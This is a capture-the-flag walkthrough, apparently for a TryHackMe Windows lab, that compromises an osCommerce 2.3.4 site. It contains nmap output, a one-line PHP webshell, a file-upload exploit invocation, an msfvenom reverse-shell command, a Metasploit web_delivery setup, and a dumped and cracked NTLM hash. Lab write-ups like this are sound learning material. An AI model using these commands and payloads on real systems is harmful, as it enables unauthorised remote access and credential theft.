@@ -1,0 +1,158 @@
+IP : 10.10.39.235
+
+Open Ports : 
+
+80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                          [26/35]
+| http-methods:                                                                                                      
+|_  Potentially risky methods: TRACE                                                                                 
+|_http-server-header: Microsoft-IIS/7.5                                                                              
+|_http-title: 404 - File or directory not found.                                                                     
+135/tcp   open  msrpc        Microsoft Windows RPC                                                                   
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                           
+443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)                                         
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28                                                
+|_http-title: Bad request!                                                                                           
+| ssl-cert: Subject: commonName=localhost                                                                            
+| Not valid before: 2009-11-10T23:48:47                                                                              
+|_Not valid after:  2019-11-08T23:48:47                                                                              
+|_ssl-date: TLS randomness does not represent time                                                                   
+| tls-alpn:                                                                                                          
+|_  http/1.1                                                                                                         
+445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)            
+3306/tcp  open  mysql        MariaDB (unauthorized)                                                                  
+8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)                                         
+| http-methods:                                                                                                      
+|_  Potentially risky methods: TRACE                                                                                 
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28                                                
+|_http-title: Index of /                                                                                             
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49160/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:67:6f:72:1c:2b (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: BLUEPRINT
+|   NetBIOS computer name: BLUEPRINT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-02-07T15:04:00+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-07T15:04:04 
+|_  start_date: 2021-02-07T14:55:09
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 123.14 seconds
+
+
+SO SMB is open, lets use eternal blue - ms17-010
+	Not vulnerable
+Lets check 80:
+	Nothing there
+Lets check 8080:
+	We have directory listing oscommerse-2.3.4
+	This is a shopping cms
+	Leta get some more info
+	
+	It is indeed a cms, running on php as disclosed by clicking on links.
+
+	Lets check for other hidden directories.
+	It has a documentation telling /catalog os default web directory.
+	Lets use gobuster for finding anything hidden.
+
+	We found an install directory, letas check that.
+
+	We are able to start a fresh install, and default credentials for database worked.
+	its localhost:root::oscommerce
+	
+	Lets setup admin username and password as admin and admin
+
+Lets search for exploits.
+	We found a RCE 44374.py exploit.
+	We also found File upload exploit : 43191.py
+	Lets download it and see what it does.
+	Lets use second one with a simple shell.php as a file to uplaod.
+		contents : <?php passthru($_GET['cmd']);?> 
+	
+	Lets run the exploit.
+
+	python3 43191.py -u http://10.10.75.227:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php
+
+	Shell uploaded, lets go to url /admin/shell.php and provide parameter ?cmd=whoami
+
+	We are authority system.
+	That means we only need to get a shell back from here and we will be in full control.
+
+	Lets create a reverse shell with msfvenom and upload it to the same folder.
+
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.9.241.177 LPORT=4444 -f exe > shell.exe
+
+	Lets upload the same.
+
+	Unable to upload because of encoding, lets use metasploit to get shell.
+
+	Start msf console.
+
+use as below
+
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  10.9.241.177     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  1234             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.3.241.177     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   3   Regsvr32
+
+
+Run the exploit.
+
+We will receive a command to run on victim, copy and run it as cmd parameter on the webshell we created.
+
+We will receive a meterpreter session.
+
+Navigating to admin desktop we found the flag.
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+
+Lets dump hashes for users.
+
+We get NTLM hash for user 
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+
+We can also use kiwi/mimikatz for the same : 30e87bf999828446a1c1209ddde4c450
+	
+The hash can be decrypted at crackstation : googleplus
+
+!!!
